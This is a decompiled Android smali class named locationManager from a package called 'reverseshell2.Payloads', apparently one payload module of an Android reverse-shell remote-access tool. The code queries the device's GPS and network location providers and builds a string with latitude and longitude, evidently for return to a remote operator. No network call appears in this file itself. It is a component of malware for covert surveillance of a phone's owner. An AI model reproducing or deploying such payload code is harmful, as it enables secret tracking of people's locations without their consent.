.class public Lcom/example/reverseshell2/Payloads/locationManager;
.super Ljava/lang/Object;
.source "locationManager.java"


# instance fields
.field activity:Landroid/app/Activity;

.field context:Landroid/content/Context;

.field isGPSEnabled:Z

.field isNetworkEnabled:Z

.field latitude:Ljava/lang/Double;

.field location:Landroid/location/Location;

.field longitude:Ljava/lang/Double;

.field mLocationManager:Landroid/location/LocationManager;


# direct methods
.method public constructor <init>(Landroid/content/Context;Landroid/app/Activity;)V
    .locals 1

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    const/4 v0, 0x0

    iput-boolean v0, p0, Lcom/example/reverseshell2/Payloads/locationManager;->isGPSEnabled:Z

    iput-boolean v0, p0, Lcom/example/reverseshell2/Payloads/locationManager;->isNetworkEnabled:Z

    iput-object p1, p0, Lcom/example/reverseshell2/Payloads/locationManager;->context:Landroid/content/Context;

    iput-object p2, p0, Lcom/example/reverseshell2/Payloads/locationManager;->activity:Landroid/app/Activity;

    return-void
.end method


# virtual methods
.method public getGPSLocation()V
    .locals 2

    iget-object v0, p0, Lcom/example/reverseshell2/Payloads/locationManager;->activity:Landroid/app/Activity;

    new-instance v1, Lcom/example/reverseshell2/Payloads/locationManager$2;

    invoke-direct {v1, p0}, Lcom/example/reverseshell2/Payloads/locationManager$2;-><init>(Lcom/example/reverseshell2/Payloads/locationManager;)V

    invoke-virtual {v0, v1}, Landroid/app/Activity;->runOnUiThread(Ljava/lang/Runnable;)V

    iget-object v0, p0, Lcom/example/reverseshell2/Payloads/locationManager;->mLocationManager:Landroid/location/LocationManager;

    if-eqz v0, :cond_0

    const-string v1, "gps"

    invoke-virtual {v0, v1}, Landroid/location/LocationManager;->getLastKnownLocation(Ljava/lang/String;)Landroid/location/Location;

    move-result-object v0

    iput-object v0, p0, Lcom/example/reverseshell2/Payloads/locationManager;->location:Landroid/location/Location;

    iget-object v0, p0, Lcom/example/reverseshell2/Payloads/locationManager;->location:Landroid/location/Location;

    if-eqz v0, :cond_0

    invoke-virtual {v0}, Landroid/location/Location;->getLatitude()D

    move-result-wide v0

    invoke-static {v0, v1}, Ljava/lang/Double;->valueOf(D)Ljava/lang/Double;

    move-result-object v0

    iput-object v0, p0, Lcom/example/reverseshell2/Payloads/locationManager;->latitude:Ljava/lang/Double;

    iget-object v0, p0, Lcom/example/reverseshell2/Payloads/locationManager;->location:Landroid/location/Location;

    invoke-virtual {v0}, Landroid/location/Location;->getLongitude()D

    move-result-wide v0

    invoke-static {v0, v1}, Ljava/lang/Double;->valueOf(D)Ljava/lang/Double;

    move-result-object v0

    iput-object v0, p0, Lcom/example/reverseshell2/Payloads/locationManager;->longitude:Ljava/lang/Double;

    :cond_0
    return-void
.end method

.method public getLocation()Ljava/lang/String;
    .locals 7

    const-string v0, ""

    const-string v1, ""

    const-string v2, ""

    const-string v3, ""

    invoke-virtual {p0}, Lcom/example/reverseshell2/Payloads/locationManager;->location_init()V

    iget-boolean v4, p0, Lcom/example/reverseshell2/Payloads/locationManager;->isNetworkEnabled:Z

    const-string v5, "\n"

    if-eqz v4, :cond_0

    iget-boolean v4, p0, Lcom/example/reverseshell2/Payloads/locationManager;->isGPSEnabled:Z

    if-eqz v4, :cond_0

    invoke-virtual {p0}, Lcom/example/reverseshell2/Payloads/locationManager;->getGPSLocation()V

    const-string v3, "GPS Location\n"

    iget-object v4, p0, Lcom/example/reverseshell2/Payloads/locationManager;->latitude:Ljava/lang/Double;

    if-eqz v4, :cond_2

    iget-object v4, p0, Lcom/example/reverseshell2/Payloads/locationManager;->longitude:Ljava/lang/Double;

    if-eqz v4, :cond_2

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v6, p0, Lcom/example/reverseshell2/Payloads/locationManager;->latitude:Ljava/lang/Double;

    invoke-virtual {v6}, Ljava/lang/Double;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v4, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v6, p0, Lcom/example/reverseshell2/Payloads/locationManager;->longitude:Ljava/lang/Double;

    invoke-virtual {v6}, Ljava/lang/Double;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v4, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    const-string v4, "lot3"

    invoke-static {v4, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    goto/16 :goto_0

    :cond_0
    iget-boolean v4, p0, Lcom/example/reverseshell2/Payloads/locationManager;->isGPSEnabled:Z

    if-eqz v4, :cond_1

    invoke-virtual {p0}, Lcom/example/reverseshell2/Payloads/locationManager;->getGPSLocation()V

    const-string v3, "GPS Location\n"

    iget-object v4, p0, Lcom/example/reverseshell2/Payloads/locationManager;->latitude:Ljava/lang/Double;

    if-eqz v4, :cond_2

    iget-object v4, p0, Lcom/example/reverseshell2/Payloads/locationManager;->longitude:Ljava/lang/Double;

    if-eqz v4, :cond_2

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v6, p0, Lcom/example/reverseshell2/Payloads/locationManager;->latitude:Ljava/lang/Double;

    invoke-virtual {v6}, Ljava/lang/Double;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v4, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v6, p0, Lcom/example/reverseshell2/Payloads/locationManager;->longitude:Ljava/lang/Double;

    invoke-virtual {v6}, Ljava/lang/Double;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v4, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    const-string v4, "lot1"

    invoke-static {v4, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_0

    :cond_1
    iget-boolean v4, p0, Lcom/example/reverseshell2/Payloads/locationManager;->isNetworkEnabled:Z

    if-eqz v4, :cond_2

    iget-object v4, p0, Lcom/example/reverseshell2/Payloads/locationManager;->activity:Landroid/app/Activity;

    new-instance v6, Lcom/example/reverseshell2/Payloads/locationManager$3;

    invoke-direct {v6, p0}, Lcom/example/reverseshell2/Payloads/locationManager$3;-><init>(Lcom/example/reverseshell2/Payloads/locationManager;)V

    invoke-virtual {v4, v6}, Landroid/app/Activity;->runOnUiThread(Ljava/lang/Runnable;)V

    const-string v3, "Network Location\n"

    iget-object v4, p0, Lcom/example/reverseshell2/Payloads/locationManager;->latitude:Ljava/lang/Double;

    if-eqz v4, :cond_2

    iget-object v4, p0, Lcom/example/reverseshell2/Payloads/locationManager;->longitude:Ljava/lang/Double;

    if-eqz v4, :cond_2

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v6, p0, Lcom/example/reverseshell2/Payloads/locationManager;->latitude:Ljava/lang/Double;

    invoke-virtual {v6}, Ljava/lang/Double;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v4, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v6, p0, Lcom/example/reverseshell2/Payloads/locationManager;->longitude:Ljava/lang/Double;

    invoke-virtual {v6}, Ljava/lang/Double;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v4, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    const-string v4, "lot2"

    invoke-static {v4, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    :cond_2
    :goto_0
    invoke-virtual {v1}, Ljava/lang/String;->isEmpty()Z

    move-result v4

    if-nez v4, :cond_3

    invoke-virtual {v2}, Ljava/lang/String;->isEmpty()Z

    move-result v4

    if-nez v4, :cond_3

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v4, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v5, "Latitude is "

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v5, "Longitude is "

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    goto :goto_1

    :cond_3
    const-string v0, "Not able to get Network Location and GPS is disbled\n"

    :goto_1
    return-object v0
.end method

.method public getNetworkLocation()V
    .locals 6

    iget-object v0, p0, Lcom/example/reverseshell2/Payloads/locationManager;->mLocationManager:Landroid/location/LocationManager;

    new-instance v5, Lcom/example/reverseshell2/Payloads/locationManager$1;

    invoke-direct {v5, p0}, Lcom/example/reverseshell2/Payloads/locationManager$1;-><init>(Lcom/example/reverseshell2/Payloads/locationManager;)V

    const-string v1, "network"

    const-wide/32 v2, 0xea60

    const/high16 v4, 0x41200000    # 10.0f

    invoke-virtual/range {v0 .. v5}, Landroid/location/LocationManager;->requestLocationUpdates(Ljava/lang/String;JFLandroid/location/LocationListener;)V

    iget-object v0, p0, Lcom/example/reverseshell2/Payloads/locationManager;->mLocationManager:Landroid/location/LocationManager;

    if-eqz v0, :cond_0

    const-string v1, "network"

    invoke-virtual {v0, v1}, Landroid/location/LocationManager;->getLastKnownLocation(Ljava/lang/String;)Landroid/location/Location;

    move-result-object v0

    iput-object v0, p0, Lcom/example/reverseshell2/Payloads/locationManager;->location:Landroid/location/Location;

    iget-object v0, p0, Lcom/example/reverseshell2/Payloads/locationManager;->location:Landroid/location/Location;

    if-eqz v0, :cond_0

    invoke-virtual {v0}, Landroid/location/Location;->getLatitude()D

    move-result-wide v0

    invoke-static {v0, v1}, Ljava/lang/Double;->valueOf(D)Ljava/lang/Double;

    move-result-object v0

    iput-object v0, p0, Lcom/example/reverseshell2/Payloads/locationManager;->latitude:Ljava/lang/Double;

    iget-object v0, p0, Lcom/example/reverseshell2/Payloads/locationManager;->location:Landroid/location/Location;

    invoke-virtual {v0}, Landroid/location/Location;->getLongitude()D

    move-result-wide v0

    invoke-static {v0, v1}, Ljava/lang/Double;->valueOf(D)Ljava/lang/Double;

    move-result-object v0

    iput-object v0, p0, Lcom/example/reverseshell2/Payloads/locationManager;->longitude:Ljava/lang/Double;

    :cond_0
    return-void
.end method

.method public location_init()V
    .locals 2

    iget-object v0, p0, Lcom/example/reverseshell2/Payloads/locationManager;->context:Landroid/content/Context;

    const-string v1, "location"

    invoke-virtual {v0, v1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/location/LocationManager;

    iput-object v0, p0, Lcom/example/reverseshell2/Payloads/locationManager;->mLocationManager:Landroid/location/LocationManager;

    iget-object v0, p0, Lcom/example/reverseshell2/Payloads/locationManager;->mLocationManager:Landroid/location/LocationManager;

    const-string v1, "gps"

    invoke-virtual {v0, v1}, Landroid/location/LocationManager;->isProviderEnabled(Ljava/lang/String;)Z

    move-result v0

    iput-boolean v0, p0, Lcom/example/reverseshell2/Payloads/locationManager;->isGPSEnabled:Z

    iget-object v0, p0, Lcom/example/reverseshell2/Payloads/locationManager;->mLocationManager:Landroid/location/LocationManager;

    const-string v1, "network"

    invoke-virtual {v0, v1}, Landroid/location/LocationManager;->isProviderEnabled(Ljava/lang/String;)Z

    move-result v0

    iput-boolean v0, p0, Lcom/example/reverseshell2/Payloads/locationManager;->isNetworkEnabled:Z

    return-void
.end method
